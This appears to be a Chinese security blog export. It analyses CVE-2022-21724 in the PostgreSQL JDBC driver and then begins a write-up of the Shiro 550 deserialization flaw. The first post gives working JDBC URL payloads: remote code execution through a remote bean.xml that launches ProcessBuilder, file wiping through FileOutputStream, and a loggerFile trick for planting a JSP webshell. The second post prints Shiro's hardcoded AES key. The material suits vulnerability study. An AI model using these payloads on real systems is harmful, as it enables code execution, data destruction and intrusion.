    <url>/2023/10/28/PostgresQL/</url>
    <content><![CDATA[<h1 id="PostgreSQL-JDBC-CVE-2022-21724"><a href="#PostgreSQL-JDBC-CVE-2022-21724" class="headerlink" title="PostgreSQL JDBC(CVE-2022-21724)"></a>PostgreSQL JDBC(CVE-2022-21724)</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>在 PostgreSQL 数据库的 jdbc 驱动程序中发现一个安全漏洞。当攻击者控制 jdbc url 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。 pgjdbc 根据通过 <code>authenticationPluginClassName</code>、<code>sslhostnameverifier</code>、<code>socketFactory</code> 、<code>sslfactory</code>、<code>sslpasswordcallback</code> 连接属性提供类名实例化插件实例。但是，驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致通过任意类加载远程代码执行。</p>
<p>影响范围：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">　　<span class="number">9.4</span><span class="number">.1208</span> &lt;=PgJDBC &lt;<span class="number">42.2</span><span class="number">.25</span></span><br><span class="line">　　<span class="number">42.3</span><span class="number">.0</span> &lt;=PgJDBC &lt; <span class="number">42.3</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>添加依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.postgresql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;postgresql&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">42.3</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt; </span><br><span class="line">    &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">5.3</span><span class="number">.23</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>编写测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sql</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/bean.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bean.xml</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xmlns:p=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">&lt;!--    普通方式创建类--&gt;</span><br><span class="line">   &lt;bean id=<span class="string">&quot;exec&quot;</span> class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> init-method=<span class="string">&quot;start&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;calc.exe&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h2 id="任意代码执行-socketFactory-socketFactoryArg"><a href="#任意代码执行-socketFactory-socketFactoryArg" class="headerlink" title="任意代码执行 socketFactory&#x2F;socketFactoryArg"></a>任意代码执行 socketFactory&#x2F;socketFactoryArg</h2><p>org.postgresql.Driver#connect⽅法最后调⽤了makeConnection⽅法,⽅法实例化了⼀个PgConnection对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Connection <span class="title function_">makeConnection</span><span class="params">(String url, Properties props)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PgConnection</span>(hostSpecs(props), user(props), database(props), props, url);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跟进这个对象的构造⽅法，其中会调⽤ConnectionFactory.openConnection⽅法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this.queryExecutor = ConnectionFactory.openConnection(hostSpecs, user, database, info);</span><br></pre></td></tr></table></figure>

<p>跟进openConnection⽅法，会实例化⼀个ConnectionFactoryImpl，然后调⽤它的openConnectionImpl⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConnectionFactoryImpl</span>();</span><br><span class="line"><span class="type">QueryExecutor</span> <span class="variable">queryExecutor</span> <span class="operator">=</span> connectionFactory.openConnectionImpl(hostSpecs, user, database, info);</span><br></pre></td></tr></table></figure>

<p>调⽤了SocketFactoryFactory.getSocketFactory⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SocketFactory</span> <span class="variable">socketFactory</span> <span class="operator">=</span> SocketFactoryFactory.getSocketFactory(info);</span><br></pre></td></tr></table></figure>

<p>跟进getSocketFactory⽅法</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SocketFactory getSocketFactory(Properties info) throws PSQLException &#123;</span><br><span class="line">    <span class="keyword">String</span> socketFactoryClassName = PGProperty.SOCKET_FACTORY.<span class="keyword">get</span>(info);</span><br><span class="line">    <span class="keyword">if</span> (socketFactoryClassName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> SocketFactory.getDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (SocketFactory)ObjectFactory.instantiate(socketFactoryClassName, info, <span class="literal">true</span>, PGProperty.SOCKET_FACTORY_ARG.<span class="keyword">get</span>(info));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">PSQLException</span>(GT.tr(<span class="string">&quot;The SocketFactory class provided &#123;0&#125; could not be instantiated.&quot;</span>, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;socketFactoryClassName&#125;), PSQLState.CONNECTION_FAILURE, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⾸先是socketFactoryClassName的获取，在info中获取socketFactory的值，默认值为nul </p>
<p>其中info记录着扩展信息，host，数据库名，port等信息，那么可以通过扩展参数设置socketFactory的值 </p>
<p>我们需要设置socketFactory不为空，以利⽤ObjectFactory.instantiate⽅法，跟进这个⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">instantiate</span><span class="params">(String classname, Properties info, <span class="type">boolean</span> tryString, String stringarg)</span> <span class="keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;info&#125;;</span><br><span class="line">        Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(classname);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctor = cls.getConstructor(Properties.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tryString &amp;&amp; ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ctor = cls.getConstructor(String.class);</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;stringarg&#125;;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var8) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">            ctor = cls.getConstructor();</span><br><span class="line">            args = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctor.newInstance((Object[])args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这⾥会通过反射实例化classname类名 ,而这里传入的是我们可控的socketFactory</p>
<p>这⾥tryString为true，我留意到中间的if语句，其中stringarg也可以通过扩展参数进⾏控制,传入的是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PGProperty.SOCKET_FACTORY_ARG.get(info)</span><br></pre></td></tr></table></figure>

<p>跟进这个发现,从get()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SOCKET_FACTORY_ARG(<span class="string">&quot;socketFactoryArg&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;Argument forwarded to constructor of SocketFactory class.&quot;</span>),</span><br></pre></td></tr></table></figure>



<p> 问题就在于我们要实例化哪个类呢？这个类⼜能对web应⽤造成伤害，需要这个类的构造⽅法只有⼀个参数，⽽且参数类型为String</p>
<ul>
<li><p>java.io.FileOutputStream类</p>
<p>对应构造⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">FileOutputStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>(name != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">File</span>(name) : <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果指定的⽂件已经存在，并且append设置为false，则⽂件的内容将被清空，并写⼊新的数据。 那么可以利⽤这个类清空⽂件内容</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//localhost:5432/baicany?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=/Users/baicany/Desktop/baicany</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>org.springframework.context.support.ClassPathXmlApplicationContext类<br>实例化ClassPathXmlApplicationContext类，可以加载并解析classpath下指定的XML配置⽂件，从⽽创建⼀个包含所有配置的应 ⽤上下⽂。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String configLocation)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;configLocation&#125;, <span class="literal">true</span>, (ApplicationContext)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用另外一个重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String[] configLocations, <span class="type">boolean</span> refresh, <span class="meta">@Nullable</span> ApplicationContext parent)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="built_in">super</span>(parent);</span><br><span class="line">    <span class="built_in">this</span>.setConfigLocations(configLocations);</span><br><span class="line">    <span class="keyword">if</span> (refresh) &#123;</span><br><span class="line">        <span class="built_in">this</span>.refresh();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在refresh⽅法中，会调⽤obtainFreshBeanFactory⽅法，该⽅法内⼜会调⽤refreshBeanFactory⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConfigurableListableBeanFactory <span class="title function_">obtainFreshBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.refreshBeanFactory();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getBeanFactory();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进refreshBeanFactory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">DefaultListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> <span class="built_in">this</span>.createBeanFactory();</span><br><span class="line">    beanFactory.setSerializationId(<span class="built_in">this</span>.getId());</span><br><span class="line">    <span class="built_in">this</span>.customizeBeanFactory(beanFactory);</span><br><span class="line">    <span class="built_in">this</span>.loadBeanDefinitions(beanFactory);</span><br><span class="line">    <span class="built_in">this</span>.beanFactory = beanFactory;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>调⽤loadBeanDefinitions⽅法，会⼀直调⽤到AbstractXmlApplicationContext#loadBeanDefinitions⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(XmlBeanDefinitionReader reader)</span> <span class="keyword">throws</span> BeansException, IOException &#123;</span><br><span class="line">    Resource[] configResources = <span class="built_in">this</span>.getConfigResources();</span><br><span class="line">    <span class="keyword">if</span> (configResources != <span class="literal">null</span>) &#123;</span><br><span class="line">        reader.loadBeanDefinitions(configResources);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] configLocations = <span class="built_in">this</span>.getConfigLocations();</span><br><span class="line">    <span class="keyword">if</span> (configLocations != <span class="literal">null</span>) &#123;</span><br><span class="line">        reader.loadBeanDefinitions(configLocations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>configResources默认为空，那么会获取ConfigLocations作为classpath去加载并且解析xml </p>
<p>那么需要⼀个恶意xml⽂件，poc通过SpEL表达式来造成RCE</p>
<h2 id="任意代码执⾏-sslfactory-sslfactoryarg"><a href="#任意代码执⾏-sslfactory-sslfactoryarg" class="headerlink" title="任意代码执⾏ sslfactory&#x2F;sslfactoryarg"></a>任意代码执⾏ sslfactory&#x2F;sslfactoryarg</h2><p>回到ConnectionFactoryImpl#openConnectionImpl⽅法，除了调⽤SocketFactoryFactory.getSocketFactory⽅法，还调⽤了 tryConnect⽅法可以利⽤（主要关注info的出处，数据可控）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">newStream = <span class="built_in">this</span>.tryConnect(user, database, info, socketFactory, hostSpec, sslMode, gssEncMode);</span><br></pre></td></tr></table></figure>

<p>跟进tryConnect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!newStream.isGssEncrypted()) &#123;</span><br><span class="line">    newStream = <span class="built_in">this</span>.enableSSL(newStream, sslMode, info, connectTimeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认isGssEncrypted⽅法返回为false，调⽤了enableSSL⽅法 在enableSSL⽅法找到info出处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">beresp</span> <span class="operator">=</span> pgStream.receiveChar();</span><br><span class="line"><span class="keyword">switch</span> (beresp) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> <span class="number">83</span>:</span><br><span class="line">                    LOGGER.log(Level.FINEST, <span class="string">&quot; &lt;=BE SSLOk&quot;</span>);</span><br><span class="line">                    MakeSSL.convert(pgStream, info);</span><br><span class="line">                    <span class="keyword">return</span> pgStream;</span><br><span class="line">...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>进⼊对应switch case语句还需通过pgStream.receiveChar⽅法判断，需要响应的第⼀个字⺟为S </p>
<p>那么就会调⽤org.postgresql.ssl.MakeSSL.convert⽅法，⽅法中调⽤了SocketFactoryFactory.getSslSocketFactory⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SocketFactoryFactory.getSslSocketFactory(info);</span><br></pre></td></tr></table></figure>

<p>在getSslSocketFactory⽅法中，同样调⽤了ObjectFactory.instantiate⽅法进⾏实例化类</p>
<p>和上面差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SocketFactory</span> <span class="variable">socketFactory</span> <span class="operator">=</span> SocketFactoryFactory.getSocketFactory(info);</span><br></pre></td></tr></table></figure>

<p>由sslfactory和sslfactoryarg两个扩展参数传递</p>
<p>payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//localhost:1234/baicany?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;sslfactoryarg=http://127.0.0.1:8080/bean.xml</span></span><br></pre></td></tr></table></figure>

<p>现在需要解决PostgreSQL响应的第⼀个字⺟为S</p>
<p>开启⼀个监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -p <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>向监听端⼝发起jdbc请求，此时程序发⽣阻塞，键⼊S后，将成功代码执⾏</p>
<h2 id="任意⽂件写⼊-loggerLevel-loggerFile"><a href="#任意⽂件写⼊-loggerLevel-loggerFile" class="headerlink" title="任意⽂件写⼊ loggerLevel&#x2F;loggerFile"></a>任意⽂件写⼊ loggerLevel&#x2F;loggerFile</h2><p>在org.postgresql.Driver#connect⽅法下，在执⾏makeConnection⽅法前，还会调⽤setupLoggerFromProperties⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">driverLogLevel</span> <span class="operator">=</span> PGProperty.LOGGER_LEVEL.get(props);</span><br><span class="line"><span class="keyword">if</span> (driverLogLevel != <span class="literal">null</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>想要继续往下调⽤，需要driverLogLevel不为null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LOGGER_LEVEL(<span class="string">&quot;loggerLevel&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;Logger level of the driver&quot;</span>, <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;OFF&quot;</span>, <span class="string">&quot;DEBUG&quot;</span>, <span class="string">&quot;TRACE&quot;</span>&#125;),</span><br></pre></td></tr></table></figure>

<p>默认为null,可以通过扩展参数修改</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">loggerLevel</span><span class="operator">=</span>DEBUG</span><br></pre></td></tr></table></figure>

<p>继续往下发现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">driverLogFile</span> <span class="operator">=</span> PGProperty.LOGGER_FILE.get(exprProps);</span><br><span class="line">             <span class="keyword">if</span> (driverLogFile == <span class="literal">null</span> || !driverLogFile.equals(loggerHandlerFile)) &#123;</span><br></pre></td></tr></table></figure>

<p>需要driverLogFile不为空,才行</p>
<p>表⽰⽇志⽂件的保存位置，LOGGER.log⽅法能向⽇志⽂件写⼊信息</p>
<p>利⽤这个思路可做JSP WebShell，将JSP恶意代码添加进URL中，然后⼀起写进⽂件中</p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//localhost:5432/baicany?loggerLevel=DEBUG&amp;loggerFile=/Users/baicany/Desktop/baicany.jsp&amp;shellcode</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对代码执行的漏洞而言，要求获取的类名必须是指定类的子类，否则就抛出异常</p>
<p><img src="https://baicany.github.io/images/image-20231029230416814.png" alt="image-20231029230416814"></p>
<p>对于任意⽂件写⼊⽽⾔，⾼版本中移除了对⽇志⽂件的设定操作 setupLoggerFromProperties(props);</p>
<p><img src="https://baicany.github.io/images/image-20231029230431095.png" alt="image-20231029230431095"></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>无依赖cb链打shrio550</title>
    <url>/2023/08/18/Shrio550/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>我这里用的spring框架，pox.xml的配置是</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>shiro会自带依赖<br>shiro-core、shiro-web是shiro本⾝的依赖</p>
<p>slf4j-api、slf4j-simple是为了显⽰shiro中的报错信息添加的依赖</p>
<p>在pom.xml中并没有引⼊commons-beautils包，它是由于引⼊了shiro依赖⾃动导⼊的。由于commons-beautils包的某些类⽤到commons-collections，但是commons-collections依赖是否必要呢？shiro只⽤到了commons-beautils的⼀些类，可以不涉及commons-collections。从pom.xml中剔除掉commons-collections依赖，发现还是可以正常运⾏shiro web应⽤的</p>
<p>这就有后面的无依赖打shrio</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>为了让浏览器或服务器重启后⽤户不丢失登录状态，Shiro⽀持将持久化信息序列化并加密后保存在Cookie的rememberMe字段 中，下次读取时进⾏解密再反序列化。但是在Shiro 1.2.4版本之前内置了⼀个默认且固定的加密Key，导致攻击者可以伪造任意 的rememberMe Cookie，进⽽触发反序列化漏洞。</p>
<p>简单介绍利用：</p>
<ul>
<li>通过在cookie的rememberMe字段中插入恶意payload，</li>
<li>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。</li>
<li>shiro 1.2.4中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</li>
<li>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Shiro &lt;&#x3D; 1.2.4</p>
<h2 id="相关代码分析"><a href="#相关代码分析" class="headerlink" title="相关代码分析"></a>相关代码分析</h2><p>在org.apache.shiro.web.mgt.CookieRememberMeManager类下，定义了⼀个常量来表⽰默认的Cookie名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_REMEMBER_ME_COOKIE_NAME</span> <span class="operator">=</span> <span class="string">&quot;rememberMe&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>继续看构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CookieRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(<span class="string">&quot;rememberMe&quot;</span>);</span><br><span class="line">    cookie.setHttpOnly(<span class="literal">true</span>);</span><br><span class="line">    cookie.setMaxAge(<span class="number">31536000</span>);</span><br><span class="line">    <span class="built_in">this</span>.cookie = cookie;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>涉及到⼀个SimpleCookie类，这个类主要记录的Cookie的⼀些基本属性</p>
<p>CookieRememberMeManager的构造⽅法得到的是⼀个Cookie类型的cookie对象。</p>
<p>这⾥的Cookie是⼀个接⼝，记录了Cookie默认值，存活时间等</p>
<p>我们可以继续去看另一个类：AbstractRememberMeManager</p>
<p>这是一个抽象类，实现了RememberMeManager接口，在这个类中，我们还可以发现默认的密钥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们继续关注一下这个类重写的RememberMeManager接口的onSuccessfulLogin方法，根据这个名字猜测应该是在登录成功后所执行的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.forgetIdentity(subject);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isRememberMe(token)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先验证了token的正确性，如果验证成功，那么就调用rememberIdentity方法，跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="built_in">this</span>.getIdentityToRemember(subject, authcInfo);</span><br><span class="line">    <span class="built_in">this</span>.rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看这里getIdentityToRemember根据字母意思猜测一下来干嘛的</p>
<p>继续跟进重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="built_in">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="built_in">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进convertPrincipalsToBytes方法,发现调用了serilize方法</p>
